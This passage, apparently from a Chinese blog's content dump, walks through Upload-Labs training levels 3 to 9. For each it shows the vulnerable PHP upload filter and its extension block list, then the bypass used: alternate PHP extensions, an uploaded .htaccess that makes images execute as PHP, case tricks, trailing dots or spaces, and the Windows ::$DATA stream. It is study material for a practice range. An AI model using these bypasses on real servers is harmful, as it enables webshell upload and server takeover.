class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                 <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    发现只过滤了<code>.asp、.aspx、.php、.jsp</code>文件，那么可以使用<code>php3、phtml、phps、php5</code>文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 <code>phtml</code>作为后缀名；而php3，我的理解是php之前版本的文件后缀，如<code>php5</code>。</p>\n<p>​    直接把<code>2333.php</code>改为<code>2333.php3</code>上传打开，执行成功。完工</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTq2cV.png\"></p>\n<h2 id=\"Pass-04\"><a href=\"#Pass-04\" class=\"headerlink\" title=\"Pass-04\"></a>Pass-04</h2><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.<code>htaccess</code>文件过滤，所以上传一个.<code>htaccess</code>文件内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n\n<p>​    原理的话我讲一下个人的见解：.<code>htaccess</code>文件是一个<code>apache</code>服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为<code>php</code>。参考的博客：<a href=\"https://www.cnblogs.com/gyrgyr/p/10773118.html\">htaccess使用方法介绍</a>。</p>\n<p>​    接下来上传<code>2333.jpg</code>图片木马，再打开就会被成功解析为<code>php</code>文件并执行：</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTqoN9.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTqqc6.png\"></p>\n<p>​    完工</p>\n<h2 id=\"Pass-05\"><a href=\"#Pass-05\" class=\"headerlink\" title=\"Pass-05\"></a>Pass-05</h2><p> 源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    细心的话可以发现，这道题的源码中在末尾添加了<code>.htaccess</code>文件过滤，但是也少了一条语句</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br></pre></td></tr></table></figure>\n\n<p>目标就很明确了，直接使用大小写绕过过滤。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTLmNj.png\"></p>\n<p>​    打开图片成功执行。完工</p>\n"},{"title":"Upload-Labs(二)","date":"2020-11-09T12:12:27.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111104025.jpg","_content":"\n## 前言\n\n​\t这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n    //这里下面是过滤\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".html\", ......);\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n\t//这里下面是移动文件。\n    \tif (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n   \n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n\n\n过滤部分：\n\n* `$deny_ext`是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。\n\n * `$file_name = trim($FILES['upload_file']['name'])`这段代码有两个点需要说：\n   1. `$FILES['upload_file']['name']`是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：[PHP $_FILES函数详解](https://www.cnblogs.com/laijinquan/p/8682282.html)。\n   2. `trim()`函数的作用就是去除文件名称前后的空格换行符等。\n* `$file_name = deldot($file_name)`这个注释中很清楚，是删除文章末尾的点。\n* `$file_ext = strrchr($file_name, '.')`中`strrchr(string s1,char c1)`函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。\n* `$file_ext = strtolower($file_ext)`注释上转换小写。\n* `$file_ext = str_ireplace('::$DATA', '', $file_ext)`去除字符串::$DATA。第八题讲了原理\n\n上传部分：\n\n* `in_array($file_ext, $deny_ext)`判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。\n* `$_FILES['upload_file']['tmp_name']`文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。\n*  `$img_path = UPLOAD_PATH.'/'.$file_name`这个变量是设置需要保存到的路径\n* `move_uploaded_file($temp_file, $img_path)`本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。\n\n\n\n## Pass-06\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t看源码发现少了`trim()`函数**对文件名前后的空格处理**，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php  (有空格)绕过黑名单数组。\n\n![](https://s1.ax1x.com/2020/11/09/Bb9jQe.png)\n\n​\t上传以后访问文件执行成功。完工\n\n![](https://s1.ax1x.com/2020/11/09/Bb9xLd.png)\n\n​\t这里说明一下，我前面是在[BUUCTF](https://buuoj.cn/)在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06-->github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。\n\n​\t\n\n## Pass-07\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t这道题少了**删除文件名末尾的点**，我们可以通过构造**2333.php. .**(末尾加 点 空格 点)，被解析后文件后缀就会成为\". \"(一个点一个空格)，可以绕过黑名单，访问的文件名是`2333.php. .`\n\n![](https://s1.ax1x.com/2020/11/09/BbCOkq.png)\n\n​\t我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个\".\"，尝试在windows靶机上测试**只添加一个点**，访问的文件名为`2333.php、2333.php.`都可以，因为windows会删除最后一个点。\n\n![](https://s1.ax1x.com/2020/11/09/BbMywV.png)\n\n![](https://s1.ax1x.com/2020/11/09/BbKXq0.png)\n\n​\t两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工\n\n\n\n## Pass-08\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t审查代码发现少了对`::$DATA`字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：\n\n> php在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名\n\n​\t直接上传的时候抓包在文件名后面添加`::$DATA`。\n\n![](https://s1.ax1x.com/2020/11/09/BbP84P.png)\n\n​\t上传访问。完工\n\n\n\n## Pass-09\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过`strrchr()`函数截取后缀名转换小写。\n\n​\t所以和第七题一样构造**2333.php. .**(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点\".\"，铁定不在黑名单后缀里，实现绕过后缀检查。\n\n​\t但是这道题**只能使用windows环境**，因为执行了`deldot()`函数删除了最后一个点之后，文件名成了`2333.php.`，而linux环境下因为不会自动删除最后一个点而不能访问成功。\n\n​\t图前面有了就不贴了。\n\n\n\n## Pass-10\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n    